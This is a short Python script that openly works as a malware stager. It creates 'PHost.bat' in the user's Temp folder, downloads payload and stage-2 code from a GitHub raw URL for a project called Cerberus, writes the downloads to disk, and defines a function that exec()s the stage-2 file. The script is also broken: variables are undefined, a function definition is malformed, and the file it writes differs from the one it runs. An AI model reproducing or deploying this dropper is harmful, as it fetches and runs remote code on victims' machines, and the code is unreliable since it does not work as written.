import os.path
import urllib.request

filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/PHost.bat") # Path to Payload

# Creates Stage2Host
if os.path.isfile((path + "/Stage2Host.py")) == False: 
    file = open('Stage2Host.py', 'a')
    file.close()

# Creates payload file
if os.path.isfile(filename) == False:
    file = open('PHost.bat', 'a')
    file.close()

with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload1.txt") as retrieve:
    data = retrieve.read().decode("utf-8")                       # Takes code from URL and decodes it to remove useless newline characters in code
    with open(filename, "a+") as file: 
        file.write(data)                     # Opens paylaod in read and write mode and appends code retrieved into it

with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2.txt") as retrieve:
    data = retrieve.read().decode("utf-8")
    with open((path + "/Stage3Host.py"), "a+") as file:
        file.write("#" + rN + "\n" + str(data) + "\n" + "#" + rN)

def runStage2:
    exec(open(path + "/Stage2Host.py").read()) # Runs Stage 2 File
